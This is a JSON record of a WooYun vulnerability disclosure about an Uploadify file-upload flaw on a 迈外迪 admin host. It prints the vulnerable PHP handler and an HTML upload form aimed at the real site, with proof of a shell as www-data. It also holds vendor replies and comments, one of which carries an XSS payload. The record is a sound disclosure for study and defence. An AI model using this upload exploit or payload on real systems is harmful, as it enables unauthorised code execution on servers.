{"id": 47001, "wybug_id": "wooyun-2014-088423", "wybug_title": "迈外迪某后台使用第三方组件存在上传漏洞", "wybug_corp": "迈外迪", "wybug_author": "猪猪侠", "wybug_date": "2014-12-24 13:18", "wybug_open_date": "2015-02-07 13:20", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向公众公开  简要描述： 迈外迪某后台使用第三方组件存在上传漏洞 详细说明：  \nhttp://widash.wiwide.com/uploadify/scripts/_notes/dwsync.xml\n存在uploadify上传组件，有用到uploadify的程序都有这个上传问题\n<?php/*Uploadify v2.1.4Release Date: November 8, 2010Copyright (c) 2010 Ronnie Garcia, Travis NickelsPermission is hereby granted, free of charge, to any person obtaining a copyof this software and associated documentation files (the \"Software\"), to dealin the Software without restriction, including without limitation the rightsto use, copy, modify, merge, publish, distribute, sublicense, and/or sellcopies of the Software, and to permit persons to whom the Software isfurnished to do so, subject to the following conditions:The above copyright notice and this permission notice shall be included inall copies or substantial portions of the Software.THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS ORIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THEAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHERLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS INTHE SOFTWARE.*/if (!empty($_FILES)) {\t$tempFile = $_FILES['Filedata']['tmp_name'];\techo $tempFile;\t$targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';\t$targetFile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];\t\t// $fileTypes  = str_replace('*.','',$_REQUEST['fileext']);\t// $fileTypes  = str_replace(';','|',$fileTypes);\t// $typesArray = split('\\|',$fileTypes);\t// $fileParts  = pathinfo($_FILES['Filedata']['name']);\t\t// if (in_array($fileParts['extension'],$typesArray)) {\t\t// Uncomment the following line if you want to make the directory if it doesn't exist\t\t// mkdir(str_replace('//','/',$targetPath), 0755, true);\t\t\t\tmove_uploaded_file($tempFile,$targetFile);\t\techo $targetFile;\t\techo str_replace($_SERVER['DOCUMENT_ROOT'],'',$targetFile);\t// } else {\t// \techo 'Invalid file type.';\t// }}?>\n漏洞利用：上传文件到网站DOCUMENT_ROOT目录下\n<html><body><form action=\"http://widash.wiwide.com/uploadify/scripts/uploadify.php\" method=\"post\" enctype=\"multipart/form-data\"><input name=\"Filedata\" type=\"file\" /><input name='folder' type='text' value=\"/\"><input name=\"sub\" type=\"submit\" value=\"upload\" /></form></body></html>\n   漏洞证明：  \n$whoamiwww-data$pwd/home/wiwide/20141030/src/www\n   修复方案：  尽量不要使用第三方组件，还被人扫描到   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-12-26 16:00 厂商回复： 问题已经确认，多谢白帽子的反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-24 13:21 |    \t\tbacktrack丶yao \t\t\t( 普通白帽子  |\t\t\t        Rank:290 漏洞数:107        | \"><img src=x onerror=alert(666666);> <im...)\t\t \n  前排留名    \n     2014-12-24 13:27 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  人家都说轻点了....修不过来了..    \n     2014-12-24 14:12 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @猪猪侠 猪哥还差第三弹呢，哈哈    \n     2014-12-24 14:30 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  疼。轻点    \n     2014-12-24 14:31 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  不鸣则已，一鸣惊人    \n     2014-12-24 15:21 |    \t\tazuer \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:30        )\t\t \n    亲 润度不够慢点！！    \n     2014-12-24 17:37 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  难道是wordpress插件？    \n     2014-12-24 20:10 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  @猪猪侠，人家肚子好痛了，  姿势一定要选对。    \n     2014-12-25 01:28 |    \t\t看什麼看 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 知有飄零，畢竟飄零，便是飄零也感卿)\t\t \n  @猪猪侠 我很好奇，这破公司才66个员工，猪哥搞他为什么呢？    \n     2014-12-25 08:40 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  有礼物    \n     2014-12-25 09:38 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  一发接一发    \n     2014-12-25 12:24 |    \t\t看什麼看 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 知有飄零，畢竟飄零，便是飄零也感卿)\t\t \n  @茜茜公主 根据我看到的资料，基本上是小白公司～～    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}